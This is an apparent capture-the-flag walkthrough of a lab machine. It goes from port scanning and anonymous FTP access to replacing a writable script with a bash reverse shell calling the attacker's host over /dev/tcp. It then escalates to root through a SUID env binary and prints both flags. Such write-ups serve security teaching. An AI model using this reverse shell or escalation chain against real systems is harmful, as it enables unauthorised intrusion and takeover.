1. Start with nmap. 4 ports open, 21 with ftp, 139/445 with smb. 

```
└─$ sudo nmap -A -T4 10.10.236.136    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-18 06:06 EDT
Nmap scan report for 10.10.236.136
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.159.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/18%OT=21%CT=1%CU=33418%PV=Y%DS=2%DC=T%G=Y%TM=6508216
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   288.61 ms 10.8.0.1
2   303.25 ms 10.10.236.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds

```

2. Checking shared smb file. 'pics' was shared. 
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.236.136    
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
                                        
```

3. Anonymous login without password and check out all 3 files. 

```
┌──(kali㉿kali)-[~]
└─$ ftp anonymous@10.10.236.136
Connected to 10.10.236.136.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40229|)
cd 150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||29866|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Sep 18 10:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get *
local: Desktop remote: *
229 Entering Extended Passive Mode (|||34620|)
550 Failed to open file.
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||59702|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |***************************************************************************************************************|   314        4.16 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (0.83 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||34640|)
150 Opening BINARY mode data connection for removed_files.log (1075 bytes).
100% |***************************************************************************************************************|  1075        2.32 MiB/s    00:00 ETA
226 Transfer complete.
1075 bytes received in 00:00 (3.63 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||60334|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |***************************************************************************************************************|    68       10.72 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.22 KiB/s)
ftp> exit
221 Goodbye.
```

4. Edit clean.sh file with bash reverse shell code and upload to ftp server. 
```
┌──(kali㉿kali)-[~]
└─$ cat clean.sh               
#!/bin/bash

bash -i >& /dev/tcp/10.8.159.78/1234 0>&1
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ftp anonymous@10.10.236.136
Connected to 10.10.236.136.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd script
550 Failed to change directory.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||31519|)
150 Ok to send data.
100% |***************************************************************************************************************|    55        1.37 MiB/s    00:00 ETA
226 Transfer complete.
55 bytes sent in 00:00 (0.08 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||24951|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000           55 Sep 18 10:16 clean.sh
-rw-rw-r--    1 1000     1000         1290 Sep 18 10:16 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 

```

5. Captured reverse shell and then get user flag. 
```
──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 1234            
[sudo] password for kali: 
listening on [any] 1234 ...
connect to [10.8.159.78] from (UNKNOWN) [10.10.236.136] 52874
bash: cannot set terminal process group (1318): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ 
```

6. Looks for suid permitted files. 
```
namelessone@anonymous:~$ find / -type f -perm -04000 -ls 2>/dev/null

/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/env

```

7. Use env suid priesc from gtfobins. 
```
namelessone@anonymous:/usr/bin$ ./env /bin/sh -p
./env /bin/sh -p
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

```

8. Rooted and get root flag. 
```
cd root
ls
root.txt
cat root.txt
4d930091c31a622a7ed10f27999af363

```